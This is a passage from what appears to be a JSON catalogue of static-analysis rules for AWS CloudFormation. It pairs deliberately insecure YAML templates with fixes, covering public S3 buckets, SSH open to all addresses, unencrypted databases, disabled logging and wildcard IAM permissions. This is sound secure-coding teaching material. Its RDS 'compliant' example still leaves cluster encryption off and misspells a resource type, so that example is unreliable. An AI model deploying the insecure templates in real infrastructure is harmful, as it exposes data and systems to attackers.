</li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cloudformation:S6303": {
        "name": "Using unencrypted RDS DB resources is security-sensitive",
        "htmlDesc": "<p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,\nsnapshots, and cluster metadata.</p>\n<p>This situation can occur in a variety of scenarios, such as:</p>\n<ul>\n  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>\n  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>\n</ul>\n<p>After a successful intrusion, the underlying applications are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of services and security bypasses via data corruption or deletion </li>\n</ul>\n<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is\nrequired as encryption at rest is fully managed by AWS.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html\">AWS::RDS::DBInstance</a> and\n<a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html\">AWS::RDS::DBCluster</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  DatabaseInstance:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: false  # Sensitive, disabled by default\n  DatabaseCluster:\n    Type: AWS::RDS:DBCluster\n    Properties:\n      StorageEncrypted: false  # Sensitive, disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-rds-database-instance.html\">AWS::RDS::DBInstance</a> and\n<a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-rds-dbcluster.html\">AWS::RDS::DBCluster</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  DatabaseInstance:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: true\n  DatabaseCluster:\n    Type: AWS::RDS:DBCluster\n    Properties:\n      StorageEncrypted: false  # Sensitive, disabled by default\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\">AWS Documentation</a> - Encrypting Amazon RDS\n  resources </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6329": {
        "name": "Allowing public network access to cloud resources is security-sensitive",
        "htmlDesc": "<p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft\nor disruption.</p>\n<p>Depending on the component, inbound access from the Internet can be enabled via:</p>\n<ul>\n  <li> a boolean value that explicitly allows access to the public network. </li>\n  <li> the assignment of a public IP address. </li>\n  <li> database firewall rules that allow public IP ranges. </li>\n</ul>\n<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>\n<p>This decision increases the likelihood of attacks on the organization, such as:</p>\n<ul>\n  <li> data breaches. </li>\n  <li> intrusions into the infrastructure to permanently steal from it. </li>\n  <li> and various malicious traffic, such as DDoS attacks. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<p>This cloud resource:</p>\n<ul>\n  <li> should be publicly accessible to any Internet user. </li>\n  <li> requires inbound traffic from the Internet to function properly. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce\nsites.</p>\n<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud\ncomponents.</p>\n<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the\nabsence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>\n<h2>Sensitive Code Example</h2>\n<p>DMS and EC2 instances have a public IP address assigned to them:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  DMSInstance:\n    Type: AWS::DMS::ReplicationInstance\n    Properties:\n      PubliclyAccessible: true # sensitive, by default it's also set to true\n\n  EC2Instance:\n    Type: AWS::EC2::Instance\n    Properties:\n      NetworkInterfaces:\n        - AssociatePublicIpAddress: true # sensitive, by default it's also set to true\n          DeviceIndex: \"0\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>DMS and EC2 instances doesn’t have a public IP address:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  DMSInstance:\n    Type: AWS::DMS::ReplicationInstance\n    Properties:\n      PubliclyAccessible: false\n\n  EC2Instance:\n    Type: AWS::EC2::Instance\n    Properties:\n      NetworkInterfaces:\n        - AssociatePublicIpAddress: false\n          DeviceIndex: \"0\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html\">AWS Documentation</a> - Amazon EC2 instance IP\n  addressing </li>\n  <li> <a href=\"https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html\">AWS Documentation</a> - Public and\n  private replication instances </li>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html\">AWS Documentation</a> - VPC Peering </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cloudformation:S6265": {
        "name": "Granting access to S3 buckets to all or authenticated users is security-sensitive",
        "htmlDesc": "<p>Predefined permissions, also known as <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">canned ACLs</a>,\nare an easy way to grant large privileges to predefined groups or users.</p>\n<p>The following canned ACLs are security-sensitive:</p>\n<ul>\n  <li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively \"read\" and \"read and write\" privileges to everyone in the world\n  (<code>AllUsers</code> group). </li>\n  <li> <code>AuthenticatedRead</code> grants \"read\" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context\nof canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>\n<h2>Sensitive Code Example</h2>\n<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PublicReadWrite</code> access control:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"mynoncompliantbucket\"\n      AccessControl: \"PublicReadWrite\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Compliant\n    Properties:\n      BucketName: \"mycompliantbucket\"\n      AccessControl: \"Private\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">AWS Documentation</a> - Access control list (ACL)\n  overview (canned ACLs) </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html\">AWS Documentation</a> - Controlling access to a bucket with\n  user policies </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cloudformation:S6281": {
        "name": "Allowing public ACLs or policies on a S3 bucket is security-sensitive",
        "htmlDesc": "<p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>\n<p>This access control can be relaxed with ACLs or policies.</p>\n<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>\n<ul>\n  <li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>\n  <li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>\n  <li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>\n  <li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket\n  owner account. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>\n  <li> These settings are not already enforced to true at the account level. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to configure:</p>\n<ul>\n  <li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li>\n  <li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li>\n  <li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li>\n  <li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>By default, when not set, the <code>PublicAccessBlockConfiguration</code> is fully deactivated (nothing is blocked):</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucketdefault:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"example\"\n</pre>\n<p>This <code>PublicAccessBlockConfiguration</code> allows public ACL to be set:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"example\"\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: false # should be true\n        BlockPublicPolicy: true\n        IgnorePublicAcls: true\n        RestrictPublicBuckets: true\n</pre>\n<h2>Compliant Solution</h2>\n<p>This <code>PublicAccessBlockConfiguration</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public\npolicies:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Compliant\n    Properties:\n      BucketName: \"example\"\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true\n        BlockPublicPolicy: true\n        IgnorePublicAcls: true\n        RestrictPublicBuckets: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\">AWS Documentation</a> - Blocking public\n  access to your Amazon S3 storage </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cloudformation:S6308": {
        "name": "Using unencrypted Elasticsearch domains is security-sensitive",
        "htmlDesc": "<p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>\n<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.\nEnabling encryption at rest will help protect:</p>\n<ul>\n  <li> indices </li>\n  <li> logs </li>\n  <li> swap files </li>\n  <li> data in the application directory </li>\n  <li> automated snapshots </li>\n</ul>\n<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>\n<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html\">AWS::Elasticsearch::Domain</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Elasticsearch:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: false  # Sensitive, disabled by default\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html\">AWS::Elasticsearch::Domain</a>:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  Elasticsearch:\n    Type: AWS::Elasticsearch::Domain\n    Properties:\n      EncryptionAtRestOptions:\n        Enabled: true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html\">AWS Documentation</a> - Encryption of\n  data at rest for Amazon Elasticsearch Service </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6321": {
        "name": "Administration services access should be restricted to specific IP addresses",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Cloud platforms such as AWS support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound\ntraffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,\nsuch as 22 for SSH, can expose these services to exploits and unauthorized access.</p>\n<h3>What is the potential impact?</h3>\n<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a\nvulnerability could have a high impact on the system.</p>\n<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the\ncredentials to log in to the system.</p>\n<h2>How to fix it</h2>\n<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those\nheld by system administrators or those of <a href=\"https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls\">bastion-like</a>\nservers.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      VpcId: !Ref ExampleVpc\n      SecurityGroupIngress:\n        - IpProtocol: tcp\n          FromPort: 22\n          ToPort: 22 # SSH traffic\n          CidrIp: \"0.0.0.0/0\" # from all IP addresses is authorized\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ExampleSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      VpcId: !Ref ExampleVpc\n      SecurityGroupIngress:\n        - IpProtocol: tcp\n          FromPort: 22\n          ToPort: 22\n          CidrIp: \"1.2.3.0/24\"\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html\">AWS Documentation</a> - Security groups for your VPC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview\">Azure Documentation</a> - Network security\n  groups </li>\n  <li> <a href=\"https://cloud.google.com/vpc/docs/using-firewalls\">GCP Documentation</a> - Firewalls </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "cloudformation:S6258": {
        "name": "Disabling logging is security-sensitive",
        "htmlDesc": "<p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>\n<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage\nenables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>\n<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will\nallow investigators to establish a timeline of the actions perpetrated by an attacker.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This component is essential for the information system infrastructure. </li>\n  <li> This component is essential for mission-critical functions. </li>\n  <li> Compliance policies require this component to be monitored. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage\ncomponents.<br> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load\nBalancer Access Logs <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html\">require an additional\nbucket policy</a>.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://aws.amazon.com/s3/\">Amazon S3 access requests</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3Bucket:\n    Type: 'AWS::S3::Bucket' # Sensitive\n    Properties:\n      BucketName: \"mynoncompliantbucket\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/api-gateway/\">Amazon API Gateway</a> stages:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Prod: # Sensitive\n    Type: AWS::ApiGateway::Stage\n    Properties:\n      StageName: Prod\n      Description: Prod Stage\n      TracingEnabled: false # Sensitive\n</pre>\n<p>For <a href=\"https://aws.amazon.com/neptune/\">Amazon Neptune</a> clusters:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Cluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports: []  # Sensitive\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> broker logs:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  SensitiveCluster:\n    Type: 'AWS::MSK::Cluster'\n    Properties:\n      ClusterName: Sensitive Cluster\n      LoggingInfo:\n        BrokerLogs: # Sensitive\n          CloudWatchLogs:\n            Enabled: false\n            LogGroup: CWLG\n          Firehose:\n            DeliveryStream: DS\n            Enabled: false\n</pre>\n<p>For <a href=\"https://aws.amazon.com/documentdb/\">Amazon DocDB</a>:</p>\n<pre>\nAWSTemplateFormatVersion: \"2010-09-09\"\nResources:\n  DocDBOmittingLogs: # Sensitive\n    Type: \"AWS::DocDB::DBCluster\"\n    Properties:\n      DBClusterIdentifier : \"DB Without Logs\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/amazon-mq/\">Amazon MQ</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Broker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:  # Sensitive\n        Audit: false\n        General: false\n</pre>\n<p>For <a href=\"https://aws.amazon.com/redshift/\">Amazon Redshift</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ClusterOmittingLogging: # Sensitive\n    Type: \"AWS::Redshift::Cluster\"\n    Properties:\n      DBName: \"Redshift Warehouse Cluster\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/opensearch-service/\">Amazon OpenSearch</a> service or Amazon Elasticsearch service:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  OpenSearchServiceDomain:\n    Type: 'AWS::OpenSearchService::Domain'\n    Properties:\n      LogPublishingOptions: # Sensitive\n        ES_APPLICATION_LOGS:\n          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-application-logs'\n          Enabled: true\n        INDEX_SLOW_LOGS:\n          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-index-slow-logs'\n          Enabled: true\n</pre>\n<p>For <a href=\"https://aws.amazon.com/cloudfront/\">Amazon CloudFront</a> distributions:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  CloudFrontDistribution: # Sensitive\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultRootObject: \"index.html\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticloadbalancing/\">Amazon Elastic Load Balancing</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  LoadBalancer:\n      Type: AWS::ElasticLoadBalancing::LoadBalancer\n      Properties:\n        AccessLoggingPolicy:\n          Enabled: false # Sensitive\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticloadbalancing/\">Amazon Load Balancing (v2)</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ApplicationLoadBalancer:\n   Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n   Properties:\n     Name: CompliantLoadBalancer\n     LoadBalancerAttributes:\n       - Key: \"access_logs.s3.enabled\"\n         Value: false # Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://aws.amazon.com/s3/\">Amazon S3 access requests</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  S3BucketLogs:\n    Type: 'AWS::S3::Bucket'\n    Properties:\n      BucketName: \"mycompliantloggingbucket\"\n      AccessControl: LogDeliveryWrite\n\n  S3Bucket:\n    Type: 'AWS::S3::Bucket'\n    Properties:\n      BucketName: \"mycompliantbucket\"\n      LoggingConfiguration:\n        DestinationBucketName: !Ref S3BucketLogs\n        LogFilePrefix: testing-logs\n</pre>\n<p>For <a href=\"https://aws.amazon.com/api-gateway/\">Amazon API Gateway</a> stages:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Prod:\n    Type: AWS::ApiGateway::Stage\n    Properties:\n      StageName: Prod\n      Description: Prod Stage\n      TracingEnabled: true\n      AccessLogSetting:\n        DestinationArn: \"arn:aws:logs:eu-west-1:123456789:test\"\n        Format: \"...\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/neptune/\">Amazon Neptune</a> clusters:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Cluster:\n    Type: AWS::Neptune::DBCluster\n    Properties:\n      EnableCloudwatchLogsExports: [\"audit\"]\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> broker logs:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  SensitiveCluster:\n    Type: 'AWS::MSK::Cluster'\n    Properties:\n      ClusterName: Sensitive Cluster\n      LoggingInfo:\n        BrokerLogs:\n          Firehose:\n            DeliveryStream: DS\n            Enabled: true\n          S3:\n            Bucket: Broker Logs\n            Enabled: true\n            Prefix: \"logs/msk-brokers-\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/documentdb/\">Amazon DocDB</a>:</p>\n<pre>\nAWSTemplateFormatVersion: \"2010-09-09\"\nResources:\n  DocDBWithLogs:\n    Type: \"AWS::DocDB::DBCluster\"\n    Properties:\n      DBClusterIdentifier : \"DB With Logs\"\n      EnableCloudwatchLogsExports:\n         - audit\n</pre>\n<p>For <a href=\"https://aws.amazon.com/amazon-mq/\">Amazon MQ</a> enable <code>Audit</code> or <code>General</code>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  Broker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        Audit: true\n        General: true\n</pre>\n<p>For <a href=\"https://aws.amazon.com/redshift/\">Amazon Redshift</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  CompliantCluster:\n    Type: \"AWS::Redshift::Cluster\"\n    Properties:\n      DBName: \"Redshift Warehouse Cluster\"\n      LoggingProperties:\n        BucketName: \"Infra Logs\"\n        S3KeyPrefix: \"log/redshift-\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/opensearch-service/\">Amazon OpenSearch</a> service, or Amazon Elasticsearch service:</p>\n<pre>\nAWSTemplateFormatVersion: '2010-09-09'\nResources:\n  OpenSearchServiceDomain:\n    Type: 'AWS::OpenSearchService::Domain'\n    Properties:\n      LogPublishingOptions:\n        AUDIT_LOGS:\n          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-audit-logs'\n          Enabled: true\n</pre>\n<p>For <a href=\"https://aws.amazon.com/cloudfront/\">Amazon CloudFront</a> distributions:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  CloudFrontDistribution:\n    Type: AWS::CloudFront::Distribution\n    Properties:\n      DistributionConfig:\n        DefaultRootObject: \"index.html\"\n        Logging:\n          Bucket: \"mycompliantbucket\"\n          Prefix: \"log/cloudfront-\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticloadbalancing/\">Amazon Elastic Load Balancing</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  LoadBalancer:\n      Type: AWS::ElasticLoadBalancing::LoadBalancer\n      Properties:\n        AccessLoggingPolicy:\n          Enabled: true\n          S3BucketName: mycompliantbucket\n          S3BucketPrefix: \"log/loadbalancer-\"\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticloadbalancing/\">Amazon Load Balancing (v2)</a>:</p>\n<pre>\nAWSTemplateFormatVersion: 2010-09-09\nResources:\n  ApplicationLoadBalancer:\n   Type: AWS::ElasticLoadBalancingV2::LoadBalancer\n   Properties:\n     Name: CompliantLoadBalancer\n     LoadBalancerAttributes:\n       - Key: \"access_logs.s3.enabled\"\n         Value: true\n       - Key: \"access_logs.s3.bucket\"\n         Value: \"mycompliantbucket\"\n       - Key: \"access_logs.s3.prefix\"\n         Value: \"log/elbv2-\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html\">AWS Documentation</a> - Logging requests using server access\n  logging </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/778\">CWE-778 - Insufficient Logging</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cloudformation:S6317": {
        "name": "AWS IAM policies should limit the scope of permissions given",
        "htmlDesc": "<p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated\nresources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions\nthan expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher\nlevel of access.</p>\n<h2>Why is this an issue?</h2>\n<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy\nwhich, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)\nare called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>\n<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>\"*\"</code> permissions for example.) This is especially\ntrue if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of\npermissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles\nthat have more permissions than they need.</p>\n<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>\n<h3>What is the potential impact?</h3>\n<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be\nable to perform actions beyond their intended scope.</p>\n<h4>Privilege escalation</h4>\n<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be\nable to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>\n<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and\ndelete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to\nexfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe\nconsequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>\n<h2>How to fix it in Identity and Access Management</h2>\n<h3>Code examples</h3>\n<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by\naltering the code of a Lambda that executes with high privileges.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nAWSTemplateFormatVersion: 2010-09-09\n\nResources:\n  # Update Lambda code\n  lambdaUpdatePolicy:\n    # Noncompliant\n    Type: AWS::IAM::ManagedPolicy\n    Properties:\n      ManagedPolicyName: lambdaUpdatePolicy\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Effect: Allow\n            Action:\n              - lambda:UpdateFunctionCode\n            Resource: \"*\"\n</pre>\n<h4>Compliant solution</h4>\n<p>The policy is narrowed such 